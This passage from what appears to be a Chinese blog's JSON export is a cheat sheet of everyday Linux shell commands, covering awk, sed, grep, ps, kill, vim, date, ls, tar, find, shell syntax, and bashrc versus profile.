class=\"line\">: <span class=\"number\">41</span>,<span class=\"number\">57</span> s/<span class=\"number\">10.13</span>.<span class=\"number\">92.143</span>/<span class=\"number\">10.13</span>.<span class=\"number\">92.157</span>/g</div></pre></td></tr></table></figure>\n<h2 id=\"七、date命令\"><a href=\"#七、date命令\" class=\"headerlink\" title=\"七、date命令\"></a>七、date命令</h2><h3 id=\"1-打印时间\"><a href=\"#1-打印时间\" class=\"headerlink\" title=\"1. 打印时间\"></a>1. 打印时间</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"built_in\">echo</span> `date <span class=\"string\">'+%Y-%m-%d %H:%M:%S'</span>`</div></pre></td></tr></table></figure>\n<h3 id=\"2-时间显示\"><a href=\"#2-时间显示\" class=\"headerlink\" title=\"2. 时间显示\"></a>2. 时间显示</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">date</div><div class=\"line\">date <span class=\"string\">'+%Y-%m-%d %H:%M:%S'</span></div></pre></td></tr></table></figure>\n<h2 id=\"八、cal命令\"><a href=\"#八、cal命令\" class=\"headerlink\" title=\"八、cal命令\"></a>八、cal命令</h2><h3 id=\"1-当年当月\"><a href=\"#1-当年当月\" class=\"headerlink\" title=\"1. 当年当月\"></a>1. 当年当月</h3><p><code>cal</code></p>\n<h3 id=\"2-某年日历\"><a href=\"#2-某年日历\" class=\"headerlink\" title=\"2. 某年日历\"></a>2. 某年日历</h3><p><code>cal 2015</code></p>\n<h3 id=\"3-某年某月\"><a href=\"#3-某年某月\" class=\"headerlink\" title=\"3. 某年某月\"></a>3. 某年某月</h3><p><code>cal 12 2015</code></p>\n<h2 id=\"九、ls命令\"><a href=\"#九、ls命令\" class=\"headerlink\" title=\"九、ls命令\"></a>九、ls命令</h2><h3 id=\"1-linux-下查看文件个数及大小\"><a href=\"#1-linux-下查看文件个数及大小\" class=\"headerlink\" title=\"1. linux 下查看文件个数及大小\"></a>1. linux 下查看文件个数及大小</h3><p><code>ls -l |grep &quot;^-&quot;|wc -l 或 find ./company -type f | wc -l</code></p>\n<h3 id=\"2-查看某文件夹下文件的个数，包括子文件夹里的。\"><a href=\"#2-查看某文件夹下文件的个数，包括子文件夹里的。\" class=\"headerlink\" title=\"2. 查看某文件夹下文件的个数，包括子文件夹里的。\"></a>2. 查看某文件夹下文件的个数，包括子文件夹里的。</h3><p><code>ls -lR|grep &quot;^-&quot;|wc -l</code></p>\n<h3 id=\"3-查看某文件夹下文件夹的个数，包括子文件夹里的。\"><a href=\"#3-查看某文件夹下文件夹的个数，包括子文件夹里的。\" class=\"headerlink\" title=\"3. 查看某文件夹下文件夹的个数，包括子文件夹里的。\"></a>3. 查看某文件夹下文件夹的个数，包括子文件夹里的。</h3><p><code>ls -lR|grep &quot;^d&quot;|wc -l</code></p>\n<h3 id=\"4-按修改先后，列出文件\"><a href=\"#4-按修改先后，列出文件\" class=\"headerlink\" title=\"4. 按修改先后，列出文件\"></a>4. 按修改先后，列出文件</h3><p><code>ls -lt</code></p>\n<h2 id=\"十、tar命令\"><a href=\"#十、tar命令\" class=\"headerlink\" title=\"十、tar命令\"></a>十、tar命令</h2><h3 id=\"1-tar打包文件，exclude选项排除指定文件或目录\"><a href=\"#1-tar打包文件，exclude选项排除指定文件或目录\" class=\"headerlink\" title=\"1. tar打包文件，exclude选项排除指定文件或目录\"></a>1. tar打包文件，exclude选项排除指定文件或目录</h3><p><code>tar zcvf ../fetch-wiki.tar.gz * --exclude=*.txt* --exclude=logs</code></p>\n<h2 id=\"十一、rm命令\"><a href=\"#十一、rm命令\" class=\"headerlink\" title=\"十一、rm命令\"></a>十一、rm命令</h2><h3 id=\"1-删除-开头的文件\"><a href=\"#1-删除-开头的文件\" class=\"headerlink\" title=\"1. 删除 - 开头的文件\"></a>1. 删除 - 开头的文件</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">rm --  -filename</div><div class=\"line\">rm -- ./-filename</div></pre></td></tr></table></figure>\n<h2 id=\"十二、echo命令\"><a href=\"#十二、echo命令\" class=\"headerlink\" title=\"十二、echo命令\"></a>十二、echo命令</h2><h3 id=\"1-echo输出制表符方式\"><a href=\"#1-echo输出制表符方式\" class=\"headerlink\" title=\"1. echo输出制表符方式\"></a>1. echo输出制表符方式</h3><p><code>echo -e &quot;123\\t345&quot;</code></p>\n<h3 id=\"2-shell换行\"><a href=\"#2-shell换行\" class=\"headerlink\" title=\"2. shell换行\"></a>2. shell换行</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"built_in\">echo</span> <span class=\"_\">-e</span> <span class=\"string\">\"123\\n34\"</span></div></pre></td></tr></table></figure>\n<p><strong>注</strong>：-e 表示特殊处理字符串里的特殊字符。</p>\n<h2 id=\"十三、tail语法\"><a href=\"#十三、tail语法\" class=\"headerlink\" title=\"十三、tail语法\"></a>十三、tail语法</h2><h3 id=\"1-查找特定字符串在文件中出现位置\"><a href=\"#1-查找特定字符串在文件中出现位置\" class=\"headerlink\" title=\"1. 查找特定字符串在文件中出现位置\"></a>1. 查找特定字符串在文件中出现位置</h3><p><code>tail -2000000 catalina.out | cat -n | grep &quot;2014-07-10&quot; | head  -2 (对于出现在文末)</code></p>\n<h2 id=\"十四、shell语法\"><a href=\"#十四、shell语法\" class=\"headerlink\" title=\"十四、shell语法\"></a>十四、shell语法</h2><h3 id=\"1-批量解压zip文件\"><a href=\"#1-批量解压zip文件\" class=\"headerlink\" title=\"1. 批量解压zip文件\"></a>1. 批量解压zip文件</h3><p><code>for z in ./*.zip; do unzip -o $z -d ./peixun-logger ; done;</code></p>\n<h3 id=\"2-判断shell脚本输入参数个数\"><a href=\"#2-判断shell脚本输入参数个数\" class=\"headerlink\" title=\"2. 判断shell脚本输入参数个数\"></a>2. 判断shell脚本输入参数个数</h3><p><code>if [ $# -eq 0 ]; then</code></p>\n<h3 id=\"3-逐行读取文本文件的-shell-脚本\"><a href=\"#3-逐行读取文本文件的-shell-脚本\" class=\"headerlink\" title=\"3. 逐行读取文本文件的 shell 脚本\"></a>3. 逐行读取文本文件的 shell 脚本</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">while read line</div><div class=\"line\">do</div><div class=\"line\">echo $line</div><div class=\"line\">done &lt; $1</div></pre></td></tr></table></figure>\n<h3 id=\"4-for循环\"><a href=\"#4-for循环\" class=\"headerlink\" title=\"4. for循环\"></a>4. for循环</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">for index in &#123;1..31&#125;</div><div class=\"line\">do</div><div class=\"line\">    ……</div><div class=\"line\">done</div></pre></td></tr></table></figure>\n<h3 id=\"5-shell注释\"><a href=\"#5-shell注释\" class=\"headerlink\" title=\"5. shell注释\"></a>5. shell注释</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">:&amp;lt;&amp;lt;comment</div><div class=\"line\">这里是个注释哈。</div><div class=\"line\">comment</div></pre></td></tr></table></figure>\n<h3 id=\"6-获取shell脚本位置-当前脚本目录\"><a href=\"#6-获取shell脚本位置-当前脚本目录\" class=\"headerlink\" title=\"6. 获取shell脚本位置/当前脚本目录\"></a>6. 获取shell脚本位置/当前脚本目录</h3><p>不能解决软链接问题：<code>$(cd &quot;$(dirname &quot;$0&quot;)&quot;; pwd)</code><br>最靠谱，能处理软链接的情况以及source加载脚本的情况：<code>echo $( cd &quot;$( dirname &quot;${BASH_SOURCE[0]}&quot; )&quot; &amp;&amp; pwd )</code></p>\n<h3 id=\"7-查看当前bash-shell版本\"><a href=\"#7-查看当前bash-shell版本\" class=\"headerlink\" title=\"7. 查看当前bash shell版本\"></a>7. 查看当前bash shell版本</h3><p>echo $BASH_VERSION</p>\n<h3 id=\"8-理解-bashrc-和-profile\"><a href=\"#8-理解-bashrc-和-profile\" class=\"headerlink\" title=\"8. 理解 bashrc 和 profile\"></a>8. 理解 bashrc 和 profile</h3><p>参见：<a href=\"https://wido.me/sunteya/understand-bashrc-and-profile\" target=\"_blank\" rel=\"external\">理解 bashrc 和 profile</a></p>\n<h4 id=\"login-shell-和-no-login-shell\"><a href=\"#login-shell-和-no-login-shell\" class=\"headerlink\" title=\"login shell 和 no-login shell\"></a>login shell 和 no-login shell</h4><p>“login shell” 代表用户登入, 比如使用 “su -“ 命令, 或者用 ssh 连接到某一个服务器上, 都会使用该用户默认 shell 启动 login shell 模式.<br>该模式下的 shell 会去自动执行 /etc/profile 和 ~/.profile 文件, 但不会执行任何的 bashrc 文件, 所以一般再 /etc/profile 或者 ~/.profile 里我们会手动去 source bashrc 文件.<br>而 no-login shell 的情况是我们在终端下直接输入 bash 或者 bash -c “CMD” 来启动的 shell.<br>该模式下是不会自动去运行任何的 profile 文件.</p>\n<h4 id=\"interactive-shell-和-non-interactive-shell\"><a href=\"#interactive-shell-和-non-interactive-shell\" class=\"headerlink\" title=\"interactive shell 和 non-interactive shell\"></a>interactive shell 和 non-interactive shell</h4><p>interactive shell 是交互式shell, 顾名思义就是用来和用户交互的, 提供了命令提示符可以输入命令.<br>该模式下会存在一个叫 PS1 的环境变量, 如果还不是 login shell 的则会去 source /etc/bash.bashrc 和 ~/.bashrc 文件<br>non-interactive shell 则一般是通过 bash -c “CMD” 来执行的bash.<br>该模式下不会执行任何的 rc 文件, 不过还存在一种特殊情况这个我之后详细讲述</p>\n<h4 id=\"bashrc-和-profile-的区别\"><a href=\"#bashrc-和-profile-的区别\" class=\"headerlink\" title=\"bashrc 和 profile 的区别\"></a>bashrc 和 profile 的区别</h4><p>看了之前那么多种状态组合, 最关键的问题是, 究竟 bashrc 和 profile 有什么区别呢?</p>\n<p><strong>profile</strong><br>其实看名字就能了解大概了, profile 是某个用户唯一的用来设置环境变量的地方, 因为用户可以有多个 shell 比如 bash, sh, zsh 之类的, 但像环境变量这种其实只需要在统一的一个地方初始化就可以了, 而这就是 profile.</p>\n<p><strong>bashrc</strong><br>bashrc 也是看名字就知道, 是专门用来给 bash 做初始化的比如用来初始化 bash 的设置, bash 的代码补全, bash 的别名, bash 的颜色. 以此类推也就还会有 shrc, zshrc 这样的文件存在了, 只是 bash 太常用了而已.</p>\n<h3 id=\"9-上条命令是否成功执行\"><a href=\"#9-上条命令是否成功执行\" class=\"headerlink\" title=\"9. 上条命令是否成功执行\"></a>9. 上条命令是否成功执行</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\">EXCODE=$?</div><div class=\"line\"><span class=\"keyword\">if</span> [ <span class=\"string\">\"<span class=\"variable\">$EXCODE</span>\"</span> == <span class=\"string\">\"0\"</span> ]; <span class=\"keyword\">then</span></div><div class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">\"O.K\"</span></div><div class=\"line\"><span class=\"keyword\">else</span></div><div class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">\"NOT O.K\"</span></div><div class=\"line\"><span class=\"keyword\">fi</span></div></pre></td></tr></table></figure>\n<h3 id=\"10-加载配置\"><a href=\"#10-加载配置\" class=\"headerlink\" title=\"10. 加载配置\"></a>10. 加载配置</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">. slave.conf</div><div class=\"line\">source slave.conf</div></pre></td></tr></table></figure>\n<p><strong>注</strong>：slave.conf里的值格式为K=V</p>\n<h3 id=\"11-执行字符串命令\"><a href=\"#11-执行字符串命令\" class=\"headerlink\" title=\"11. 执行字符串命令\"></a>11. 执行字符串命令</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">SLAVE_PID_COMMAND=&quot;ps -ef | grep $SECRET_ID | grep -v grep | awk &apos;&#123;print \\$2&#125;&apos;&quot;</div><div class=\"line\">SLAVE_PID=$(eval $SLAVE_PID_COMMAND)</div></pre></td></tr></table></figure>\n<p><strong>注</strong>：<br>\\$要转义处理执行<br>执行字符串里的命令，使用eval命令<br>获取命令执行结果，可以用$()把命令包里来。</p>\n<h3 id=\"12-获取某文件路径文件名\"><a href=\"#12-获取某文件路径文件名\" class=\"headerlink\" title=\"12. 获取某文件路径文件名\"></a>12. 获取某文件路径文件名</h3><p>basename soft_install/jenkins-job-install/archive/jdk1.7.0_60.tar.gz .tar.gz =&gt; jdk1.7.0_60</p>\n<h2 id=\"十五、find命令\"><a href=\"#十五、find命令\" class=\"headerlink\" title=\"十五、find命令\"></a>十五、find命令</h2><h3 id=\"1-删除所有文件名包含Ulysses-Group的文件\"><a href=\"#1-删除所有文件名包含Ulysses-Group的文件\" class=\"headerlink\" title=\"1. 删除所有文件名包含Ulysses-Group的文件\"></a>1. 删除所有文件名包含Ulysses-Group的文件</h3><p><code>find . -name &quot;*Ulysses-Group*&quot; -exec rm -rf {} \\;</code></p>\n<h2 id=\"十六、其他命令\"><a href=\"#十六、其他命令\" class=\"headerlink\" title=\"十六、其他命令\"></a>十六、其他命令</h2><h3 id=\"1-磁盘格式转换为ntfs-会格式化磁盘\"><a href=\"#1-磁盘格式转换为ntfs-会格式化磁盘\" class=\"headerlink\" title=\"1. 磁盘格式转换为ntfs( 会格式化磁盘 )\"></a>1. 磁盘格式转换为ntfs( 会格式化磁盘 )</h3><p><code>convert X: /fs:ntfs</code></p>\n<h3 id=\"2-命令后台处理\"><a href=\"#2-命令后台处理\" class=\"headerlink\" title=\"2. 命令后台处理\"></a>2. 命令后台处理</h3><p><code>nohup command &amp;</code></p>\n<h3 id=\"3-重启ibus\"><a href=\"#3-重启ibus\" class=\"headerlink\" title=\"3. 重启ibus\"></a>3. 重启ibus</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">killall ibus-daemon</div><div class=\"line\">ibus-daemon -drx</div></pre></td></tr></table></figure>\n<h3 id=\"4-查看用户使用的shell版本\"><a href=\"#4-查看用户使用的shell版本\" class=\"headerlink\" title=\"4. 查看用户使用的shell版本\"></a>4. 查看用户使用的shell版本</h3><p>finger [USERNAME]</p>\n<h3 id=\"5-tee\"><a href=\"#5-tee\" class=\"headerlink\" title=\"5. tee\"></a>5. tee</h3><p>重定向到文件并打印到屏幕</p>\n<p>参见：<a href=\"http://blog.csdn.net/love_gaohz/article/details/8100808\" target=\"_blank\" rel=\"external\">tee–重定向到文件并打印到屏幕</a></p>\n","excerpt":"<p><img src=\"/asserts/images/logo/ubuntu.png\" class=\"img-logo img-center\" /></p>\n<h2 id=\"一、awk命令\"><a href=\"#一、awk命令\" class=\"headerlink\" title=\"一、awk命令\"></a>一、awk命令</h2><h3 id=\"1-删除重复的、非连续的行\"><a href=\"#1-删除重复的、非连续的行\" class=\"headerlink\" title=\"1. 删除重复的、非连续的行\"></a>1. 删除重复的、非连续的行</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">`awk &apos;! a[$0]++&apos;`</div></pre></td></tr></table></figure>\n<h3 id=\"2-awk使用特殊分隔符分隔列\"><a href=\"#2-awk使用特殊分隔符分隔列\" class=\"headerlink\" title=\"2. awk使用特殊分隔符分隔列\"></a>2. awk使用特殊分隔符分隔列</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">echo &quot;192.168.102.134&quot; | awk -F . &apos;&#123;print $4&#125;&apos;</div></pre></td></tr></table></figure>\n<h2 id=\"二、sed命令\"><a href=\"#二、sed命令\" class=\"headerlink\" title=\"二、sed命令\"></a>二、sed命令</h2><h3 id=\"1-截取程序日志中某个时间范围内的文本\"><a href=\"#1-截取程序日志中某个时间范围内的文本\" class=\"headerlink\" title=\"1. 截取程序日志中某个时间范围内的文本\"></a>1. 截取程序日志中某个时间范围内的文本</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">sed -n &apos;/^2015-05-14 15:32:30/,/^2015-05-14 16:12:09/p&apos; access_log &gt; log.txt</div></pre></td></tr></table></figure>\n<h3 id=\"2-去除空白行的sed\"><a href=\"#2-去除空白行的sed\" class=\"headerlink\" title=\"2. 去除空白行的sed\"></a>2. 去除空白行的sed</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">SECRET=`sed &apos;/^$/d&apos; file.txt | head -1`</div></pre></td></tr></table></figure>\n<h3 id=\"3-通过sed替换字特殊字符\"><a href=\"#3-通过sed替换字特殊字符\" class=\"headerlink\" title=\"3. 通过sed替换字特殊字符\"></a>3. 通过sed替换字特殊字符</h3><p><code>echo &quot;12,34,56&quot; | sed &#39;s/,/ /g&#39;</code></p>\n<h3 id=\"4-通过sed替换二者之间的字符串内容\"><a href=\"#4-通过sed替换二者之间的字符串内容\" class=\"headerlink\" title=\"4. 通过sed替换二者之间的字符串内容\"></a>4. 通过sed替换二者之间的字符串内容</h3><p>文本内容：<br><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">server</span>   <span class=\"attr\">id</span>=<span class=\"string\">\"film-web\"</span>   <span class=\"attr\">address</span>=<span class=\"string\">\"127.0.0.1\"</span> <span class=\"attr\">port</span>=<span class=\"string\">\"6881\"</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">server</span>&gt;</span></div></pre></td></tr></table></figure></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">sed -n &quot;s/\\( *server.*port=\\&quot;\\).*\\(\\&quot;.*\\)/\\1abc\\2/p&quot; 1.txt</div><div class=\"line\">sed -n &quot;s/\\( *server.*address=\\&quot;\\).*\\(\\&quot; *port\\)/\\1abc\\2/p&quot; 1.txt</div></pre></td></tr></table></figure>\n<p><strong>注</strong>：sed里，使用圆括号括起来的内容，可以看做是变量。使用\\1和\\2来输出。<br><strong>参见</strong>：<a href=\"http://coolshell.cn/articles/9104.html\">http://coolshell.cn/articles/9104.html</a> 圆括号匹配</p>\n<h3 id=\"5-从替换开始匹配行到行尾或结束匹配行区间内替换内容\"><a href=\"#5-从替换开始匹配行到行尾或结束匹配行区间内替换内容\" class=\"headerlink\" title=\"5. 从替换开始匹配行到行尾或结束匹配行区间内替换内容\"></a>5. 从替换开始匹配行到行尾或结束匹配行区间内替换内容</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">sed -i &quot;/ *server *id=/,\\$&#123;s/\\(\\&lt;watchdog-port&gt;\\).*\\(&lt;\\/watchdog-port&gt;\\)/\\18000\\2/g;&#125;&quot; resin.conf</div><div class=\"line\">sed &quot;/ *server *id=\\&quot;/,/&lt;\\/server&gt;/&#123;s/\\(\\&lt;watchdog-port&gt;\\).*\\(&lt;\\/watchdog-port&gt;\\)/\\18888\\2/g;&#125;&quot; resin.conf</div></pre></td></tr></table></figure>\n<p><strong>注</strong>：每个匹配前后都需要加/，见上面红色部分。$表示最后一行，不需要加/</p>\n<h2 id=\"三、grep命令\"><a href=\"#三、grep命令\" class=\"headerlink\" title=\"三、grep命令\"></a>三、grep命令</h2><h3 id=\"1-查找特定文件指定字符串\"><a href=\"#1-查找特定文件指定字符串\" class=\"headerlink\" title=\"1. 查找特定文件指定字符串\"></a>1. 查找特定文件指定字符串</h3><p><code>grep &quot;no object DCH for MIME type multipart/mixed&quot; *.log &gt; MIME.log</code></p>\n<h3 id=\"2-查找文本内容\"><a href=\"#2-查找文本内容\" class=\"headerlink\" title=\"2. 查找文本内容\"></a>2. 查找文本内容</h3><p><code>grep -i -r --exclude=*.jar --exclude=*.log* noah .</code></p>\n<h3 id=\"3-查看tomcat日志特定内容\"><a href=\"#3-查看tomcat日志特定内容\" class=\"headerlink\" title=\"3. 查看tomcat日志特定内容\"></a>3. 查看tomcat日志特定内容</h3><p><code>tail -f catalina.out | grep timecost | grep FamilyController | awk &#39;{if($10 &gt; 100) print $0}&#39;</code></p>\n<h3 id=\"4-查看tomcat某天日志\"><a href=\"#4-查看tomcat某天日志\" class=\"headerlink\" title=\"4. 查看tomcat某天日志\"></a>4. 查看tomcat某天日志</h3><p><code>tail -800000 catalina.out | grep 2014-06-30 &gt; 2014-06-30.log</code></p>\n<h3 id=\"5-记录统计\"><a href=\"#5-记录统计\" class=\"headerlink\" title=\"5. 记录统计\"></a>5. 记录统计</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">grep timecost file.txt | wc -l</div><div class=\"line\">ls | wc -l</div></pre></td></tr></table></figure>\n<h3 id=\"6-grep与或非\"><a href=\"#6-grep与或非\" class=\"headerlink\" title=\"6. grep与或非\"></a>6. grep与或非</h3><h4 id=\"与操作\"><a href=\"#与操作\" class=\"headerlink\" title=\"与操作\"></a>与操作</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">grep -E &apos;pattern1.*pattern2&apos; file.txt # in that order</div><div class=\"line\">grep -E &apos;pattern1.*pattern2|pattern2.*pattern1&apos; file.txt # in any order</div><div class=\"line\">grep &apos;pattern1&apos; file.txt | grep &apos;pattern2&apos; # in any order</div></pre></td></tr></table></figure>\n<h4 id=\"或操作\"><a href=\"#或操作\" class=\"headerlink\" title=\"或操作\"></a>或操作</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">grep &quot;pattern1\\|pattern2&quot; file.txt</div><div class=\"line\">grep -E &quot;pattern1|pattern2&quot; file.txt</div><div class=\"line\">grep -e pattern1 -e pattern2 file.txt</div><div class=\"line\">egrep &quot;pattern1|pattern2&quot; file.txt</div></pre></td></tr></table></figure>\n<h4 id=\"非操作\"><a href=\"#非操作\" class=\"headerlink\" title=\"非操作\"></a>非操作</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">grep -v <span class=\"string\">'pattern1'</span> file.txt</div></pre></td></tr></table></figure>\n<p>摘自：<a href=\"http://www.shellhacks.com/en/Using-BASH-Grep-OR-Grep-AND-Grep-NOT-Operators\">Using BASH “Grep OR / Grep AND / Grep NOT” Operators</a></p>\n<h3 id=\"7-递归查询不包含指定内容的文件\"><a href=\"#7-递归查询不包含指定内容的文件\" class=\"headerlink\" title=\"7. 递归查询不包含指定内容的文件\"></a>7. 递归查询不包含指定内容的文件</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">grep -irL &quot;date:&quot; file.txt</div></pre></td></tr></table></figure>","more":"<h2 id=\"四、ps命令\"><a href=\"#四、ps命令\" class=\"headerlink\" title=\"四、ps命令\"></a>四、ps命令</h2><h3 id=\"1-cpu-内存占用率排序\"><a href=\"#1-cpu-内存占用率排序\" class=\"headerlink\" title=\"1. cpu/内存占用率排序\"></a>1. cpu/内存占用率排序</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">ps auxw --sort=%cpu</div><div class=\"line\">ps auxw --sort=%mem</div></pre></td></tr></table></figure>\n<h3 id=\"2-查看端口占用\"><a href=\"#2-查看端口占用\" class=\"headerlink\" title=\"2. 查看端口占用\"></a>2. 查看端口占用</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">lsof -i:8080</div><div class=\"line\">ps -aux | grep java</div><div class=\"line\">ps -aux | grep pid</div></pre></td></tr></table></figure>\n<h2 id=\"五、kill命令\"><a href=\"#五、kill命令\" class=\"headerlink\" title=\"五、kill命令\"></a>五、kill命令</h2><h3 id=\"1-批量关闭进程\"><a href=\"#1-批量关闭进程\" class=\"headerlink\" title=\"1. 批量关闭进程\"></a>1. 批量关闭进程</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"built_in\">kill</span> -9 `ps -ef | grep QQ | grep -v <span class=\"string\">'grep'</span> | awk &#123;<span class=\"string\">'print $2'</span>&#125;`</div></pre></td></tr></table></figure>\n<h3 id=\"2-进程批量中止\"><a href=\"#2-进程批量中止\" class=\"headerlink\" title=\"2. 进程批量中止\"></a>2. 进程批量中止</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"built_in\">kill</span> -9 `ps -ef | grep QQ | grep -v grep | awk &#123;<span class=\"string\">'print $2'</span>&#125;`</div></pre></td></tr></table></figure>\n<h2 id=\"六、vim命令\"><a href=\"#六、vim命令\" class=\"headerlink\" title=\"六、vim命令\"></a>六、vim命令</h2><h3 id=\"1-vim显示-隐藏行号\"><a href=\"#1-vim显示-隐藏行号\" class=\"headerlink\" title=\"1. vim显示/隐藏行号\"></a>1. vim显示/隐藏行号</h3><figure class=\"highlight vim\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">:<span class=\"keyword\">set</span> <span class=\"keyword\">nu</span> 或 :<span class=\"keyword\">set</span> <span class=\"keyword\">number</span></div><div class=\"line\">:<span class=\"keyword\">set</span> nonu 或 :<span class=\"keyword\">set</span> nonumber</div></pre></td></tr></table></figure>\n<h3 id=\"2-vim替换指定区域匹配文本\"><a href=\"#2-vim替换指定区域匹配文本\" class=\"headerlink\" title=\"2. vim替换指定区域匹配文本\"></a>2. vim替换指定区域匹配文本</h3><figure class=\"highlight vim\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">: <span class=\"number\">41</span>,<span class=\"number\">57</span> s/<span class=\"number\">10.13</span>.<span class=\"number\">92.143</span>/<span class=\"number\">10.13</span>.<span class=\"number\">92.157</span>/g</div></pre></td></tr></table></figure>\n<h2 id=\"七、date命令\"><a href=\"#七、date命令\" class=\"headerlink\" title=\"七、date命令\"></a>七、date命令</h2><h3 id=\"1-打印时间\"><a href=\"#1-打印时间\" class=\"headerlink\" title=\"1. 打印时间\"></a>1. 打印时间</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"built_in\">echo</span> `date <span class=\"string\">'+%Y-%m-%d %H:%M:%S'</span>`</div></pre></td></tr></table></figure>\n<h3 id=\"2-时间显示\"><a href=\"#2-时间显示\" class=\"headerlink\" title=\"2. 时间显示\"></a>2. 时间显示</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">date</div><div class=\"line\">date <span class=\"string\">'+%Y-%m-%d %H:%M:%S'</span></div></pre></td></tr></table></figure>\n<h2 id=\"八、cal命令\"><a href=\"#八、cal命令\" class=\"headerlink\" title=\"八、cal命令\"></a>八、cal命令</h2><h3 id=\"1-当年当月\"><a href=\"#1-当年当月\" class=\"headerlink\" title=\"1. 当年当月\"></a>1. 当年当月</h3><p><code>cal</code></p>\n<h3 id=\"2-某年日历\"><a href=\"#2-某年日历\" class=\"headerlink\" title=\"2. 某年日历\"></a>2. 某年日历</h3><p><code>cal 2015</code></p>\n<h3 id=\"3-某年某月\"><a href=\"#3-某年某月\" class=\"headerlink\" title=\"3. 某年某月\"></a>3. 某年某月</h3><p><code>cal 12 2015</code></p>\n<h2 id=\"九、ls命令\"><a href=\"#九、ls命令\" class=\"headerlink\" title=\"九、ls命令\"></a>九、ls命令</h2><h3 id=\"1-linux-下查看文件个数及大小\"><a href=\"#1-linux-下查看文件个数及大小\" class=\"headerlink\" title=\"1. linux 下查看文件个数及大小\"></a>1. linux 下查看文件个数及大小</h3><p><code>ls -l |grep 